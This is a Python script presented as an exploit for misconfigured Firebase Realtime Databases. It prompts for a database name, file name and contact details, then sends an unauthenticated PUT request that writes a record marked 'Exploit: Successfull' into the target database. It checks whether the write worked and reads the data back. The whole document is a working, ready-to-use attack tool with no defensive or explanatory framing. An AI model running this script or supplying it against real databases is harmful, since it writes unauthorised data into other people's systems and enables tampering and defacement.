import requests


line = "<<======================================================================>>"

#Input Data
print ("[>] Input Data for exploit\n")
site = input("[+] Enter firebase Database Name : ")
file = input("[+] Enter filename    : ")
name = input("[+] Enter name        : ")
email= input("[+] Enter email       : ")
website = input("[+] Enter Website     : ")
message = input("[+] Enter A Message   : ")

#Payload
site_url = "https://"+site+".firebaseio.com/"+file+".json"

data = {"Exploit": "Successfull", "website": website, "email": email, "name": name, "message": message}

response = requests.put(site_url,json=data)

#Collecting file

print (line)
if response.status_code == 200:
    print ("[*] Exploited\n")
    print ("File Created: https://"+site+".firebaseio.com/"+file+".json\n")
else:
    print ("[*] Not Exploited\n")
    print ("No File Created")
print (line)
print ("""If you get a response 'Permission Denied' with 'Successfully
Exploited' This shows Exploit is written but can't be read.
Verify by visiting the URL""")
print (" ")
print("[>] Response\n")
r = requests.get("https://"+site+".firebaseio.com/"+file+".json")
print (r.text)
print (line)
#Reasoning
if response.status_code == 200:
 print ("[>>] Successfully Exploited")
elif response.status_code == 401:
 print ("[x] Not Exploitable \n[!] Reason: All Permissions Denied")
elif response.status_code == 404:
 print ("[x] Database Not Found \n[!] Reason: Firebase Database Not Found")
else:
 print ("[x] Unknown Error \n[!] Reason: Unknown Error\n")

